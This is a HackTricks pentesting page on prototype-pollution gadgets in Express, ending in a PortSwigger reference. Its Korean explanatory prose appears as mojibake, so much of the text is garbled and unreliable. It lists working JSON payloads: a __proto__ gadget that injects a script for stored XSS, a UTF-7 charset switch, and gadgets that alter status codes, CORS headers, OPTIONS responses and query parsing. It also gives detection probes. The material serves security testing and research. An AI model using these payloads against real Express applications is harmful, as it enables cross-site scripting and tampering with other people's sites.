# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## XSS ì‘ë‹µ ì œê³µ

**ìì„¸í•œ ë‚´ìš©ì€** [**ì›ë³¸ ì—°êµ¬ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”**](https://portswigger.net/research/server-side-prototype-pollution)

### JSON ì½˜í…ì¸  ìœ í˜•ì„ HTMLë¡œ ë³€ê²½

**JSON ì½˜í…ì¸  ìœ í˜• ì‘ë‹µ**ì„ ì‚¬ìš©í•˜ê³  JSONì„ ë°˜ì˜í•˜ëŠ” Express ì•±ì—ì„œ:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
ì´ ê²½ìš° JSON ì½˜í…ì¸  ìœ í˜•ìœ¼ë¡œ XSSëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ í†µí•´ **Expressê°€ HTML ì‘ë‹µì„ ì œê³µí•˜ë„ë¡ í˜¼ë€ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ì´ ì·¨ì•½ì ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ **`res.send(obj)`**ë¥¼ ì‚¬ìš©í•˜ê³  application/json ì½˜í…ì¸  ìœ í˜•ìœ¼ë¡œ ë³¸ë¬¸ íŒŒì„œë¥¼ ì‚¬ìš©í•˜ëŠ” ë° ì˜ì¡´í•©ë‹ˆë‹¤.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`** ë° **`_body`** ì†ì„±ì„ **ì˜¤ì—¼ì‹œí‚´ìœ¼ë¡œì¨**, **Expressê°€ HTML ì½˜í…ì¸  ìœ í˜•ì„ ì œê³µí•˜ê³ ** `_body` ì†ì„±ì„ ë°˜ì˜í•˜ê²Œ í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¡œ ì¸í•´ ì €ì¥ëœ XSSê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### UTF7 ë Œë”ë§

Expressê°€ **UTF-7 ì½˜í…ì¸ ë¥¼ ë Œë”ë§í•˜ë„ë¡** ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## ì•ˆì „í•œ ìŠ¤ìºë‹ ê¸°ìˆ 

### JSON ê³µë°±

ë‹¤ìŒ PPëŠ” JSON ë‚´ë¶€ì˜ ì†ì„±ì— ì¶”ê°€ ê³µë°±ì„ ë§Œë“¤ì–´ ê¸°ëŠ¥ì´ ì¤‘ë‹¨ë˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤:
```json
{"__proto__":{"json spaces": " "}}
```
ê·¸ëŸ¼ ë°˜ì‚¬ëœ JSONì€ ë‹¤ìŒê³¼ ê°™ì´ ë³´ì…ë‹ˆë‹¤:
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

ë‹¤ìŒ PP ê°€ì ¯ì€ ì„œë²„ê°€ HTTP í—¤ë”ë¥¼ ë°˜í™˜í•˜ë„ë¡ í•©ë‹ˆë‹¤: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
It requires the **CORS ëª¨ë“ˆì´ ì„¤ì¹˜ë˜ì–´ì•¼ í•©ë‹ˆë‹¤**

### **OPTIONS ë©”ì„œë“œ**

ë‹¤ìŒ í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ë©´ **OPTIONS ì‘ë‹µì—ì„œ ë©”ì„œë“œë¥¼ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **ìƒíƒœ**

ë‹¤ìŒ PP í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ **ë°˜í™˜ëœ ìƒíƒœ ì½”ë“œ**ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```json
{"__proto__":{"status":510}}
```
### ì˜¤ë¥˜

ì›ì‹œê°’(ì˜ˆ: ë¬¸ìì—´)ìœ¼ë¡œ í”„ë¡œí† íƒ€ì…ì— í• ë‹¹í•˜ë©´ **í”„ë¡œí† íƒ€ì…ì€ ê°ì²´ì—¬ì•¼ í•˜ë¯€ë¡œ no-op ì‘ì—…ì´ ë°œìƒí•©ë‹ˆë‹¤**. `Object.prototype` ìì²´ì— í”„ë¡œí† íƒ€ì… ê°ì²´ë¥¼ í• ë‹¹í•˜ë ¤ê³  í•˜ë©´ **ì˜ˆì™¸ê°€ ë°œìƒí•©ë‹ˆë‹¤**. ìš°ë¦¬ëŠ” ì´ ë‘ ê°€ì§€ ë™ì‘ì„ ì‚¬ìš©í•˜ì—¬ **í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì´ ì„±ê³µí–ˆëŠ”ì§€ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflected Value

ì‘ìš© í”„ë¡œê·¸ë¨ì´ ì‘ë‹µì— ê°ì²´ë¥¼ í¬í•¨í•  ë•Œ, **`__proto__`ì™€ í•¨ê»˜ ë¹„ì •ìƒì ì¸ ì´ë¦„ì˜ ì†ì„±ì„ ìƒì„±í•˜ëŠ” ê²ƒ**ì€ ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ, **ì‘ë‹µì— ë¹„ì •ìƒì ì¸ ì†ì„±ë§Œ ë°˜í™˜ë˜ëŠ” ê²½ìš°** ì´ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ì·¨ì•½ì ì„ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```json
{"unusualName":"value","__proto__":"test"}
```
ë˜í•œ Lodashì™€ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ì‚¬ìš©ë˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” í”„ë¡œí† íƒ€ì… ì˜¤ì—¼(PP)ì„ í†µí•´ ì†ì„±ì„ ì„¤ì •í•˜ê³  ê°ì²´ ë‚´ë¶€ì—ì„œ ì§ì ‘ ì„¤ì •í•˜ëŠ” ê²ƒì´ ë˜ ë‹¤ë¥¸ ì§„ë‹¨ ì ‘ê·¼ ë°©ì‹ì„ ì œê³µí•©ë‹ˆë‹¤. ë§Œì•½ ì´ëŸ¬í•œ ì†ì„±ì´ ì‘ë‹µì—ì„œ ìƒëµëœë‹¤ë©´, ì´ëŠ” Lodashê°€ ë³‘í•©í•˜ê¸° ì „ì— ëŒ€ìƒ ê°ì²´ì—ì„œ ì†ì„±ì˜ ì¡´ì¬ë¥¼ í™•ì¸í•˜ê³  ìˆìŒì„ ì‹œì‚¬í•©ë‹ˆë‹¤:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Allow Dots

Expressì—ëŠ” **ì¿¼ë¦¬ ë¬¸ìì—´ ë§¤ê°œë³€ìˆ˜ë¡œë¶€í„° ê°ì²´ë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ”** ì˜µì…˜ì´ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì€ **í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì **ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ ë²„ê·¸ **ì²´ì¸**ì—ì„œ í™•ì‹¤íˆ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz`ëŠ” Nodeì—ì„œ ê°ì²´ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.**

## References

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
